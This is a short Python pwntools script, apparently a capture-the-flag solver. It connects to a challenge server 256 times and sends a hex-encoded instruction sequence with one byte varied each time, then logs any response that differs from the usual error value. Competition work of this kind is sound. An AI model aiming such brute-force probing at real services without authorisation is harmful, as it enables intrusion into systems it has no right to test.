from pwn import *

def conn():
    return remote('segnalooo.challenges.ooo', 4321)

for i in range(256):
    c = conn()
    log.info(f'i={i}')
    c.sendline(f'cd{i:02x}68000100009d90')
    c.recvuntil(':')
    s = c.clean()
    if b'00000002' not in s and len(s) > 1:
        log.success(s)
